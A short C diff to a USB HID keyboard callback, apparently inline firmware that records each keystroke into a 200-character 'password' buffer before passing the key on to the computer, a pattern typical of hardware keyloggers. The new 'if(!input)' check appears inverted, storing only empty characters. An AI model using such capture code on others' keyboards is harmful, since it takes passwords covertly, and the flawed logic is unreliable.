@@ -27,11 +27,14 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
 
     //get every input
     static int password_index = 0;
-    //    password[password_index] = hid2azerty(report);
-    if(password_index++ >= 200)
-        password_index = 0;
-    if(password_size++ >= 200)
-        password_size = 200;
+    char       input          = hid2azerty(report);
+    if(!input) {
+        password[password_index] = (uint16_t)input;
+        if(password_index++ >= 200)
+            password_index = 0;
+        if(password_size++ >= 200)
+            password_size = 200;
+    }
 
     if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
         /* send the key on the computer */
